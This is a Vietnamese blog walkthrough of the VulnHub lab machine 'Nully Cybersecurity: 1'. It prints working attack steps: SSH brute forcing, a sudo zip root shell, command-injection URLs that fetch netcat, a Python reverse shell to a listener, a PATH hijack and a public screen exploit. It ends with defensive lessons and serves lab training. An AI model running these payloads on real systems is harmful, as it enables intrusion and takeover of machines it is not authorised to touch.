---
layout: post
title: "Nully Cybersecurity (VulnHub) — walkthrough cho người mới"
date: 2026-03-08
author: Nguyen Nam Khanh
tags: [vulnhub, walkthrough, pentest, privilege-escalation, pivoting]
description: >
  Walkthrough đầy đủ, dễ hiểu cho người mới về máy ảo Nully Cybersecurity trên
  VulnHub: từ một lần quét cổng khi chưa có quyền gì cho tới root trên cả ba
  server, pivot xuyên qua một mạng Docker nội bộ trên đường đi.
---

[English]({{ '/2026/03/08/nully-cybersecurity-walkthrough.html' | relative_url }}) · **Tiếng Việt**

> **Chỉ dùng trong lab.** Mọi thao tác dưới đây đều thực hiện trên *Nully
> Cybersecurity: 1*, một máy ảo cố ý để lỗ hổng, chạy trong mạng cô lập của
> riêng tôi. Đừng bao giờ áp dụng các kỹ thuật này lên hệ thống bạn không sở
> hữu hoặc không được cho phép bằng văn bản để kiểm thử.

Nếu bạn mới bước vào penetration testing, một máy dạng "boot-to-root" là cách
học tốt nhất: bạn khởi đầu chỉ với một địa chỉ IP và từng bước leo lên quyền
quản trị cao nhất (`root`). Máy này rất đáng để bắt đầu vì nó không phải một câu
đố đơn lẻ — nó là **ba** máy nối chuỗi với nhau, và bạn phải *pivot* (bắc cầu)
từ máy này sang máy kế tiếp.

Đi hết bài này bạn sẽ chạm vào gần như mọi giai đoạn của một đợt đánh giá thực
tế: recon, đọc mail server, crack mật khẩu, command injection, reverse shell,
pivot mạng, và bốn năm mẹo leo quyền khác nhau.

---

## Dựng lại ở nhà

Bạn có thể tải đúng máy ảo này về và làm theo từng bước.

| | |
|---|---|
| **Máy** | Nully Cybersecurity: 1 |
| **Tác giả** | laf3r |
| **Nguồn** | [Trang VulnHub](https://www.vulnhub.com/entry/nully-cybersecurity-1,549/) |
| **Phát hành** | 6/9/2020 |
| **Độ khó** | Dễ–trung bình |
| **Định dạng** | VirtualBox OVA (~1.4 GB), `NullyCybersecurityCTF.zip` |

**Cấu hình tôi dùng:**

1. Tải OVA từ trang VulnHub rồi import vào **VirtualBox** (tác giả lưu ý nó chạy
   ổn trên VirtualBox hơn VMware). Trước khi import, hãy kiểm tra file tải về với
   checksum MD5/SHA1 ghi trên trang VulnHub.
2. Đặt máy mục tiêu vào card mạng **Host-Only** để nó chỉ nói chuyện được với máy
   tấn công của bạn, không ra được internet. Việc này giữ cho lab an toàn và kết
   quả quét sạch sẽ.
3. Chạy một máy tấn công Kali (hoặc Linux bất kỳ) trong cùng mạng host-only đó.

> Xuyên suốt bài, mục tiêu lần đầu xuất hiện ở `192.168.1.46`. IP của bạn sẽ
> khác — hãy thay bằng IP của bạn ở mọi chỗ. (Máy này được dựng trong hai lần
> khác nhau nên vài IP nội bộ có đổi giữa chừng; tôi sẽ nhắc ở đúng chỗ xảy ra.)

---

## Flag 1 — Mail server

### Tìm mục tiêu

Chưa biết IP của máy, nên ta quét mạng nội bộ bằng `netdiscover` — công cụ gửi
gói ARP và liệt kê mọi host trả lời:

```bash
netdiscover -i eth1 -r 192.168.1.0/24
```

Một host nổi bật ở `192.168.1.46`, và địa chỉ MAC của nó thuộc *PCS
Systemtechnik GmbH* — đúng mã nhà sản xuất mà VirtualBox hay dùng. Đó là máy của
ta.

### Quét cổng

`nmap` cho biết dịch vụ nào đang chạy. `-sC` chạy các script mặc định an toàn,
`-sV` lấy banner phiên bản, `-v` để in chi tiết:

```bash
nmap -sC -sV 192.168.1.46 -v
```

![Kết quả nmap với năm cổng mở]({{ '/images/nully-cybersecurity/01-nmap.png' | relative_url }})

Có năm cổng mở:

| Cổng | Dịch vụ |
|---|---|
| 80 | HTTP (web) |
| 110 | POP3 (email) |
| 2222 | SSH |
| 8000 | HTTP (một web app khác) |
| 9000 | (dùng ở phần sau) |

Trang web ở cổng 80 gợi ý rằng chỉ **POP3 (110)** và **SSH (2222)** là mục tiêu
được phép tấn công từ bên ngoài, và nó đưa luôn cho ta một bộ thông tin đăng
nhập hòm thư.

### Đọc mail qua POP3

POP3 là giao thức email cũ, dạng văn bản thuần — ta có thể "nói chuyện" tay với
nó bằng `telnet`. `USER` và `PASS` để đăng nhập, `LIST` liệt kê thư đang chờ,
`RETR 1` đọc thư đầu tiên:

```bash
telnet 192.168.1.46 110
USER pentester
PASS qKnGByeaeQJWTjj2efHxst7Hu0xHADGO
LIST
RETR 1
```

![Đọc email của Bob qua POP3]({{ '/images/nully-cybersecurity/02-pop3-mail.png' | relative_url }})

Có đúng một thư, từ quản trị mail server **Bob Smith**, và anh ta thừa nhận mật
khẩu của mình rất đơn giản. Đó là gợi ý mạnh: admin hay đặt mật khẩu theo tên
mình, và một mật khẩu yếu thì mời gọi brute force.

### Brute-force SSH với tài khoản Bob

Ta lập một wordlist nhỏ gồm các tên liên quan đến Bob (`username.txt`) rồi để
`hydra` thử từng mục vừa làm username vừa làm password đối với SSH cổng 2222.
`-f` dừng ngay khi thành công lần đầu:

```bash
hydra -L username.txt -P username.txt -f ssh://192.168.1.46:2222
```

Kết quả: **`bob` / `bobby1985`**.

![hydra tìm ra mật khẩu SSH của bob]({{ '/images/nully-cybersecurity/03-hydra-ssh.png' | relative_url }})

```bash
ssh bob@192.168.1.46 -p 2222
```

### Từ Bob lên root

Việc đầu tiên nên kiểm tra sau khi vào được một máy Linux là xem user được phép
chạy gì dưới danh nghĩa người khác:

```bash
sudo -l
```

Bob được chạy `/opt/scripts/check.sh` dưới tài khoản `my2user`. Script đó lại ghi
được, nên ta chèn vào một dòng mở shell (`/bin/bash`) rồi chạy nó — một bước
"đi ngang" kinh điển sang tài khoản khác:

```bash
sudo -u my2user /bin/bash /opt/scripts/check.sh
```

![Shell với quyền my2user]({{ '/images/nully-cybersecurity/04-shell-my2user.png' | relative_url }})

Giờ đang là `my2user`, ta lại chạy `sudo -l`. User này được chạy **`zip` với
quyền root mà không cần mật khẩu**. `zip` có mặt trên [GTFOBins](https://gtfobins.github.io/gtfobins/zip/#sudo),
nơi liệt kê cách lạm dụng các binary thường ngày. Chiêu như sau:

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

Vì sao nó hoạt động, nói đơn giản:

- `zip` được chạy với quyền **root**, nên bất cứ thứ gì nó khởi chạy cũng là root.
- `-T` bảo `zip` *kiểm tra* (test) archive sau khi tạo.
- `-TT 'sh #'` thay lệnh test mặc định bằng **lệnh của ta**. `zip` chạy `sh` (một
  shell root) và dấu `#` biến phần còn lại của dòng thành chú thích.

Giờ ta đã có **shell root trên mail server**, và lấy được Flag 1.

---

## Flag 2 — Pivot sang web server

Có root trên một máy hiếm khi là toàn bộ câu chuyện. Máy này nằm trong một mạng
Docker nội bộ (`172.17.0.0/16`) mà ta chỉ nhìn thấy được *từ* mail server. Việc
vươn tới những máy ẩn đó gọi là **pivoting**. Trước tiên ta thả một khóa SSH lên
mail server làm cửa hậu ổn định, rồi mới dò.

### Lập bản đồ mạng nội bộ

Từ mail server, ta quét dải nội bộ bằng `netdiscover`:

```bash
netdiscover -i eth0 -r 172.17.0.0/16
```

`172.17.0.1` là gateway. Dò tiếp các máy khác:

- `172.17.0.3` mở cổng **80** → một **web server** (xác nhận bằng `curl`).
- `172.17.0.2` mở cổng **21** → một **file server** FTP (dùng ở Flag 3).

### Tunnel web app ẩn về máy ta

Laptop tấn công của ta không với tới `172.17.0.x` trực tiếp, nên ta dựng một
**SSH tunnel** (local port forward) xuyên qua mail server. Nhờ vậy web server từ
xa hiện ra thành `localhost:8000` ngay trên máy ta:

```bash
ssh -L 8000:172.17.0.3:80 root@192.168.1.46 -p 2222 -i id_rsa
```

![Đã dựng local port forward]({{ '/images/nully-cybersecurity/05-ssh-tunnel.png' | relative_url }})

Giờ `http://localhost:8000` *chính là* web server nội bộ.

### Tìm trang dính lỗi

`dirb` brute-force các tên file và thư mục phổ biến để tìm trang ẩn:

```bash
dirb http://localhost:8000
```

Nó lộ ra thư mục `/ping/` liệt kê được, bên trong có `ping.php`. Ghi chú trên
trang bảo dùng tham số `host`, và nó chạy thẳng giá trị đó mà không kiểm tra:

```
http://localhost:8000/ping/ping.php?host=172.17.0.1
```

![ping.php phản chiếu output của lệnh — command injection]({{ '/images/nully-cybersecurity/06-ping-command-injection.png' | relative_url }})

Đây là **OS command injection** sách giáo khoa: mọi thứ ta nối sau dấu `;` đều
được thực thi trên server.

### Lấy shell với quyền www-data

Trước tiên ta đẩy một binary `netcat` lên mục tiêu thông qua lỗ hổng injection
(với quyền web user thấp, máy không cài gói được, nên ta `wget` một bản tự host):

```
http://localhost:8000/ping/ping.php?host=; wget http://172.17.0.5:9000/nc
http://localhost:8000/ping/ping.php?host=; chmod 777 nc
```

Reverse shell bằng `nc` không nổ (bản build này thiếu tùy chọn `-e`), nên ta
quay sang một dòng Python. Nó kết nối **ngược về listener chạy trên mail server**
— máy pivot của ta — tại `172.17.0.5:9000`:

```python
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("172.17.0.5",9000));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
subprocess.call(["/bin/sh","-i"])'
```

Từng phần làm gì: tạo một socket mạng, kết nối ngược về listener của ta, đấu
input/output/lỗi của shell (`0`,`1`,`2`) vào socket đó, rồi mở một shell tương
tác.

> **Lưu ý IP:** sau một lần reboot VM, các địa chỉ nội bộ đổi chỗ — ở thời điểm
> này `172.17.0.5` là mail server (listener của ta), `172.17.0.2` là file
> server, và `172.17.0.3` là web server. Hãy chỉnh theo đúng những gì
> `netdiscover` của bạn hiển thị.

![Reverse shell với quyền www-data]({{ '/images/nully-cybersecurity/07-reverse-shell.png' | relative_url }})

Ta vào được với quyền thấp **`www-data`**.

### Hai user, hai đường leo quyền

Lùng các file thuộc sở hữu của những user đáng chú ý cho ra hai manh mối:

```bash
find / -type f -user 1000 2>/dev/null   # Oscar
find / -type f -user 1001 2>/dev/null   # Oliver
```

- **Oliver** để quên một file backup `.secret` chứa mật khẩu của anh ta
  (`4hppfvhb9pW4E4OrbMLwPETRgVo2KyyDTqGF`). Ta đăng nhập thành Oliver.
- **Oscar** sở hữu một `python3` có **SUID** (chương trình luôn chạy dưới quyền
  chủ sở hữu). Chạy nó với cờ privileged sẽ giữ nguyên danh tính Oscar thay vì bỏ
  đi:

  ```bash
  python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
  ```

  (`-p` = chế độ privileged: không hạ quyền đã nâng.) Từ home của Oscar ta lấy
  được mật khẩu của anh ta (`H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o`) rồi SSH vào
  đàng hoàng với tài khoản Oscar.

### Root bằng PATH hijack

Trong home của Oscar có thư mục `/scripts` chứa một chương trình SUID-root tên
`current-date`. **SUID-root** nghĩa là nó luôn chạy dưới quyền root, bất kể ai
khởi chạy. Ta soi chuỗi trong nó:

```bash
strings current-date
```

![Output strings của current-date]({{ '/images/nully-cybersecurity/08-strings-current-date.png' | relative_url }})

Nó gọi `date` **không kèm đường dẫn đầy đủ** (không phải `/bin/date`). Nghĩa là
hệ thống đi tìm `date` trong các thư mục liệt kê ở `$PATH` — mà `$PATH` thì ta
kiểm soát được. Vậy ta đặt một `date` giả mở ra shell *giữ nguyên quyền root*,
đẩy thư mục của nó lên đầu `$PATH`, rồi chạy `current-date`:

```bash
cd /tmp
printf '#!/bin/bash\n/bin/bash -p\n' > date
chmod +x date
export PATH=/tmp:$PATH
current-date
```

`-p` ở đây rất quan trọng: một `bash` bình thường sẽ bỏ quyền SUID ngay khi khởi
chạy, nên thiếu nó bạn sẽ rớt về user của mình. Có `-p`, shell giữ nguyên quyền
root mà nó thừa hưởng từ `current-date` SUID.

> Báo cáo gốc thực hiện đúng kiểu PATH-hijack này nhưng giữ các lệnh chính xác ở
> trong ảnh chụp; khối lệnh trên là dạng chuẩn, chạy được, của kỹ thuật đó.

![Root trên web server — 2_flag.txt]({{ '/images/nully-cybersecurity/09-root-web-server.png' | relative_url }})

Giờ ta làm chủ **web server**, và `2_flag.txt` là của ta.

---

## Flag 3 — File server và database server

### Vét file server qua FTP ẩn danh

Từ web server ta với được tới **file server** ở `172.17.0.2`, nơi cho phép **FTP
ẩn danh** — đăng nhập bằng username `anonymous` và bỏ trống mật khẩu:

![FTP ẩn danh được bật]({{ '/images/nully-cybersecurity/10-anonymous-ftp.png' | relative_url }})

Bên trong có `file.txt` (chẳng có gì) và `backup.zip`. Ta chuyển archive về máy
mình bằng `netcat` cho dễ thao tác:

```bash
# trên server từ xa
nc -w 3 192.168.18.145 8888 < backup.zip
# trên máy ta
nc -lvnp 8888 > backup.zip
```

### Crack mật khẩu archive

File zip có mã hóa. `zip2john` biến nó thành một hash để `john` (John the
Ripper) crack:

```bash
zip2john backup.zip > zip.hash
john zip.hash
```

Mật khẩu là **`1234567890`**.

![john crack mật khẩu zip]({{ '/images/nully-cybersecurity/11-john-zip-crack.png' | relative_url }})

Bên trong là thông tin đăng nhập của một user, **donald**, người có quyền truy
cập **database server**. Ta SSH sang đó từ web server.

### Root bằng khai thác `screen`

Trên database server, `linpeas` (công cụ tự dò đường leo quyền) đánh dấu một
binary SUID: **`screen-4.5.0`**. Đúng phiên bản này có một lỗ hổng local root nổi
tiếng, [Exploit-DB 41154](https://www.exploit-db.com/raw/41154).

Nói ngắn gọn: `screen` chạy dưới quyền root, và bản này xử lý sai tùy chọn
log-file, nên có thể bị lừa để nạp một shared library do kẻ tấn công cung cấp
dưới quyền root. Exploit công bố là một shell script tự chứa — nó tự viết và biên
dịch hai file phụ nhỏ (một library và một chương trình root-shell bé xíu), rồi
khởi chạy `screen` để library được nạp với quyền root:

```bash
# lưu Exploit-DB 41154 thành 41154.sh, rồi:
chmod +x 41154.sh
./41154.sh
# -> rơi vào một shell root
```

![Root trên database server]({{ '/images/nully-cybersecurity/12-root-db-server.png' | relative_url }})

Thế là ta có **root trên database server** và flag cuối cùng. Cả ba server đều
bị chiếm.

---

## Máy này dạy ta điều gì

Nếu bạn viết lại cho portfolio, giá trị không nằm ở các flag — mà ở việc cho thấy
bạn hiểu *vì sao* mỗi bước thành công và một người phòng thủ chặn nó ra sao:

- **Mật khẩu tái sử dụng / dễ đoán** (`bobby1985`) → áp dụng mật khẩu mạnh, duy
  nhất và giới hạn tần suất đăng nhập SSH.
- **Script ghi được nhưng chạy qua `sudo`** → đừng để user sửa được một script mà
  họ chạy được dưới danh nghĩa người khác.
- **Binary GTFOBins trong `sudoers`** (`zip`) → cấp quyền `sudo` hẹp nhất có thể,
  và đối chiếu mọi binary được phép với GTFOBins.
- **Input không kiểm tra đưa thẳng vào shell** (`ping.php`) → đừng bao giờ dựng
  lệnh shell từ input người dùng; dùng API an toàn và allow-list.
- **Chương trình SUID gọi binary bằng tên, không bằng đường dẫn đầy đủ**
  (`current-date`) → luôn dùng đường dẫn tuyệt đối và reset `$PATH` trong các
  chương trình đặc quyền.
- **FTP ẩn danh + mật khẩu zip yếu** → tắt truy cập ẩn danh và coi file "backup"
  như của để dành quý giá nhất.
- **Phần mềm SUID lỗi thời** (`screen 4.5.0`) → vá, và gỡ bit SUID ở nơi không
  cần.

Một mật khẩu yếu ở rìa ngoài đã biến thành quyền kiểm soát toàn bộ một mạng nội
bộ — bởi mỗi máy đều tin tưởng máy đứng trước nó.

---

*Viết bởi **Nguyễn Nam Khánh** ([@Khanh1916](https://github.com/Khanh1916)).*
